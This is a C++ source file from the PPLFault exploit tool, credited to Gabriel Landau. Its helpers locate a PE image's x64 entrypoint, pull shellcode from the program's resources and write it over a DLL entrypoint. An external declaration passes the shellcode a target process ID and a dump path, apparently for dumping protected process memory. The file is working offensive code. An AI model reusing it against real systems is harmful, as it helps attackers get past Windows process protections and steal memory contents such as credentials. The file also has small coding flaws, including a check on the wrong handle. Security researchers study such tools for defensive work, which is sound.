// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "PayloadUtils.h"
#include <DbgHelp.h>
#include <string>
#include "Logging.h"

extern bool InitShellcodeParams(
    PVOID pParams,
    DWORD dwTargetProcessId,
    PCWCHAR pDumpPath
);

// Finds the address within buf of the image entrypoint 
PVOID FindEntrypointVA(const std::string& buf)
{
    PVOID pBase = (PVOID)buf.data();
    PIMAGE_NT_HEADERS pNtHeaders = ImageNtHeader(pBase);

    if (NULL == pNtHeaders)
    {
        Log(Error, "FindOffsetOfEntrypoint: ImageNtHeader failed with GLE %u.  Is this a PE file?", GetLastError());
        return NULL;
    }

    if (IMAGE_FILE_MACHINE_AMD64 != pNtHeaders->FileHeader.Machine)
    {
        Log(Error, "FindOffsetOfEntrypoint: Only x64 is supported");
        return NULL;
    }

    // Map RVA -> VA
    return ImageRvaToVa(pNtHeaders, pBase, pNtHeaders->OptionalHeader.AddressOfEntryPoint, NULL);
}

// Pulls the shellcode out of our resource section and writes to the given pointer
bool WriteShellcode(LPCWSTR lpResourceName, PVOID pBuf, SIZE_T maxLength, DWORD& bytesWritten)
{
    HRSRC hr = NULL;
    HGLOBAL hg = NULL;
    LPVOID pResource = NULL;
    DWORD rSize = 0;

    hr = FindResourceW(NULL, lpResourceName, RT_RCDATA);
    if (!hr)
    {
        Log(Error, "GetShellcode: FindResource failed with GLE %u", GetLastError());
        return false;
    }

    hg = LoadResource(NULL, hr);
    if (!hr)
    {
        Log(Error, "GetShellcode: LoadResource failed with GLE %u", GetLastError());
        return false;
    }

    pResource = (LPVOID)LockResource(hg);
    if (!pResource)
    {
        Log(Error, "GetShellcode: LockResource failed with GLE %u", GetLastError());
        return false;
    }

    rSize = SizeofResource(NULL, hr);
    if (!rSize)
    {
        Log(Error, "GetShellcode: SizeofResource returned 0 and GLE %u", GetLastError());
        return false;
    }

    if (rSize > maxLength)
    {
        Log(Error, "GetShellcode: SizeofResource returned 0 and GLE %u", GetLastError());
        return false;
    }

    memcpy(pBuf, pResource, rSize);
    bytesWritten = rSize;

    Log(Debug, "GetShellcode: %u bytes of shellcode written over DLL entrypoint", rSize);

    FreeResource(pResource);

    return true;
}
